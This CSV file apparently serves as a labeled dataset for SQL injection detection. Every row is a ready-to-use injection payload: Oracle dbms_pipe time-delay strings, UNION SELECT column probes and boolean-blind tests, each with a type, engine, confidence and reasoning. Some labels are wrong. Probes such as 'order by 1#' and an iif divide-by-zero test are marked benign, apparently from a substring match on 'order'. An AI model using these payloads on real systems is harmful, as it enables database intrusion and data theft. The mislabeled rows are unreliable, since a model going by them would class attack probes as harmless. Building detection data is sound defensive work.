id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
22624,"1"" ) ) as yutu where 1306 = 1306 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22656,"1' where 8360 = 8360 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22730,"1' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22745,"1%"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""%"" = """,time_blind,oracle,1.0,"Signals: 'dbms_pipe', 'chr'; Time-blind SQLi (sleep/delay function); DB: oracle",2
22639,"iif ( 6307 = 2459,1,1/0 )",benign,mysql,0.9,Signals: 'if'; DB: mysql. Payload length: 25 chars.,2
22695,"1"" order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 14 chars.,2
22782,"-9672%"" ) ) ) order by 1#",benign,mysql,0.9,Signals: 'ord'; DB: mysql. Payload length: 25 chars.,2
22605,"-5761"" ) or 3762 = 1274",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
22607,"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",union_based,generic,0.7,UNION-based payload detected. Payload length: 69 chars.,2
22616,"1"" ) ) union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
22618,"1 union all select null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 40 chars.,2
22626,"1%' ) union all select null,null,null,null,null,null,null#",union_based,generic,0.7,UNION-based payload detected. Payload length: 58 chars.,2
22628,"-9541 ) as bnky where 3934 = 3934 union all select 3934,3934,3934#",union_based,generic,0.7,UNION-based payload detected. Payload length: 66 chars.,2
22635,-4351' ) or 6525 = 9458,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 23 chars.,2
22646,1' ) ) ) and 7401 = 9838#,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 25 chars.,2
22650,"1'+ ( select 'bztp' where 2541 = 2541 union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.7,UNION-based payload detected. Payload length: 106 chars.,2
22651,"-5115"" union all select 1642,1642,1642,1642,1642,1642,1642,1642--",union_based,generic,0.7,UNION-based payload detected. Payload length: 65 chars.,2
22652,"-6581'|| ( select 'hpjd' where 7608 = 7608 union all select 7608,7608,7608,7608,7608,7608,7608,7608#",union_based,generic,0.7,UNION-based payload detected. Payload length: 100 chars.,2
22661,"-3518 ) union all select 1877,1877,1877,1877#",union_based,generic,0.7,UNION-based payload detected. Payload length: 45 chars.,2
22665,"1"" ) as fcrx where 2929 = 2929 and 2820 = 5133",boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 46 chars.,2
22666,"-8414%"" ) union all select 2795#",union_based,generic,0.7,UNION-based payload detected. Payload length: 32 chars.,2
22676,"-3068%"" ) ) union all select 6597,6597,6597,6597,6597,6597,6597,6597--",union_based,generic,0.7,UNION-based payload detected. Payload length: 70 chars.,2
22678,"-2725"" union all select 3671,3671,3671,3671,3671#",union_based,generic,0.7,UNION-based payload detected. Payload length: 49 chars.,2
22679,1' ) ) as cyom where 2318 = 2318 and 7533 = 7533--,boolean_blind,generic,0.7,Boolean-blind SQLi (OR/AND logic). Payload length: 50 chars.,2
22682,"-3205"" ) union all select 5233,5233,5233,5233#",union_based,generic,0.7,UNION-based payload detected. Payload length: 46 chars.,2
